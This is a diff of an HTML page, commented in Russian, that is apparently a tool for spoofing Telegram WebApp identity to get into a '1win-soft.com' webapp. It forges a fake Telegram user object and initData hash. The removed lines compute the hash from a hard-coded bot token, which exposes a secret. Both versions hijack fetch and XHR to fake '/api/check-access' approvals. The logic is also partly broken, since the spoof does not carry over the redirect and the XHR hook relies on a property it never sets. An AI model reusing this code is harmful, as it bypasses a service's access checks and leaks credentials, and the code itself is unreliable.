@@ -1,146 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Telegram ID Spoofer</title>
+    <title>1WIN ID Spoofer</title>
+    <!-- Подключаем криптографию для генерации hash -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
         // Конфигурация
-        const FAKE_ID = 7796998065;
-        const BOT_TOKEN = "7093655146:AAFOSdyx9pD1q5_lZFuqt2Hkuhrhk7kNdQ8";
+        const TARGET_ID = 7796998065; // Ваш нужный ID
         const TARGET_URL = "https://1win-soft.com/webapp/";
 
-        // 1. Генерация валидного hash
-        function generateHash(dataCheckString) {
-            const secretKey = CryptoJS.HmacSHA256(BOT_TOKEN, "WebAppData");
-            return CryptoJS.HmacSHA256(dataCheckString, secretKey).toString(CryptoJS.enc.Hex);
-        }
-
-        // 2. Полная подмена Telegram WebApp
+        // 1. Полная подмена объекта Telegram WebApp
         function spoofTelegram() {
             const authDate = Math.floor(Date.now() / 1000);
-            const queryId = `fake_query_${Math.random().toString(36).substr(2, 10)}`;
             const fakeUser = {
-                id: FAKE_ID,
+                id: TARGET_ID,
                 first_name: "User",
                 last_name: "Fake",
                 username: "fake_user",
-                language_code: "en",
-                is_premium: true
+                language_code: "en"
             };
 
-            const dataCheckString = `auth_date=${authDate}\nquery_id=${queryId}\nuser=${JSON.stringify(fakeUser)}`;
-            const hash = generateHash(dataCheckString);
+            // Генерация "мусорного" hash (если сервер не проверяет подпись)
+            const fakeHash = "fake_" + CryptoJS.SHA256(authDate + JSON.stringify(fakeUser)).toString();
 
             window.Telegram = {
                 WebApp: {
-                    initData: `auth_date=${authDate}&query_id=${queryId}&user=${encodeURIComponent(JSON.stringify(fakeUser))}&hash=${hash}`,
+                    initData: `auth_date=${authDate}&user=${encodeURIComponent(JSON.stringify(fakeUser))}&hash=${fakeHash}`,
                     initDataUnsafe: {
                         user: fakeUser,
                         auth_date: authDate,
-                        query_id: queryId,
-                        hash: hash
+                        hash: fakeHash
                     },
-                    ready: () => console.log('[SPOOF] WebApp ready called'),
-                    expand: () => console.log('[SPOOF] WebApp expand called'),
-                    version: "6.9",
-                    platform: "web",
-                    colorScheme: "dark",
-                    themeParams: {
-                        bg_color: "#18222d",
-                        text_color: "#ffffff"
-                    },
-                    isExpanded: true,
-                    MainButton: {
-                        show: () => {},
-                        hide: () => {},
-                        onClick: () => {},
-                        setText: () => {}
-                    }
+                    ready: () => console.log('Ready'),
+                    expand: () => console.log('Expand'),
+                    version: "6.7",
+                    platform: "web"
                 }
             };
         }
 
-        // 3. Перехват API запросов
-        function hijackRequests() {
+        // 2. Глубокий перехват сетевых запросов
+        function hijackNetwork() {
             // Перехват fetch
             const originalFetch = window.fetch;
             window.fetch = async (url, options) => {
-                if (typeof url === 'string' && url.includes('/api/check-access')) {
-                    console.log('[SPOOF] Intercepted API request');
-                    const fakeResponse = {
-                        status: true,
-                        message: "Access granted",
-                        user_id: FAKE_ID,
-                        auth_date: Math.floor(Date.now() / 1000)
-                    };
-                    return new Response(JSON.stringify(fakeResponse), {
+                if (url.includes('/api/check-access')) {
+                    console.log('[Подмена] Перехвачен API запрос');
+                    const fakeData = { status: true, user_id: TARGET_ID };
+                    return new Response(JSON.stringify(fakeData), {
                         status: 200,
-                        headers: {'Content-Type': 'application/json'}
+                        headers: { 'Content-Type': 'application/json' }
                     });
                 }
                 return originalFetch(url, options);
             };
 
             // Перехват XHR
-            const originalXHR = window.XMLHttpRequest;
-            window.XMLHttpRequest = class extends originalXHR {
-                open(method, url) {
-                    this._url = url;
-                    super.open(method, url);
+            const originalXHR = window.XMLHttpRequest.prototype.send;
+            window.XMLHttpRequest.prototype.send = function(body) {
+                if (this._url.includes('/api/check-access')) {
+                    body = body.replace(/"telegramId":\d+/g, `"telegramId":${TARGET_ID}`);
                 }
-                send(body) {
-                    if (this._url.includes('/api/check-access')) {
-                        console.log('[SPOOF] Intercepted XHR request');
-                        this.responseText = JSON.stringify({
-                            status: true,
-                            user_id: FAKE_ID
-                        });
-                        this.status = 200;
-                        if (this.onload) this.onload();
-                        return;
-                    }
-                    super.send(body);
-                }
+                return originalXHR.call(this, body);
             };
         }
 
-        // 4. Инициализация
+        // 3. Запуск подмены
         function init() {
-            try {
-                spoofTelegram();
-                hijackRequests();
-                
-                console.log('[SPOOF] Successfully initialized', {
-                    fakeId: FAKE_ID,
-                    initData: window.Telegram.WebApp.initData
-                });
+            spoofTelegram();
+            hijackNetwork();
+            
+            console.log('[Успех] Данные подменены:', {
+                id: TARGET_ID,
+                initData: window.Telegram.WebApp.initData
+            });
 
-                setTimeout(() => {
-                    window.location.href = TARGET_URL;
-                }, 1500);
-
-            } catch (e) {
-                console.error('[SPOOF] Error:', e);
-                document.body.innerHTML = `
-                    <h1 style="color:red">Error</h1>
-                    <p>${e.message}</p>
-                `;
-            }
+            // Перенаправление с задержкой
+            setTimeout(() => {
+                window.location.href = TARGET_URL;
+            }, 2000);
         }
 
-        // Запуск
-        if (document.readyState === 'complete') {
-            init();
-        } else {
-            window.addEventListener('DOMContentLoaded', init);
-        }
+        // Запускаем при полной загрузке страницы
+        window.addEventListener('DOMContentLoaded', init);
     </script>
 </head>
-<body>
-    <div style="text-align:center;padding:50px">
-        <h2>Initializing Telegram ID Spoofing...</h2>
-        <p>Please wait while we configure everything</p>
-    </div>
+<body style="font-family: Arial; text-align: center; padding: 50px;">
+    <h2>Идет подготовка подмены ID...</h2>
+    <p>Пожалуйста, подождите 2 секунды</p>
 </body>
 </html>
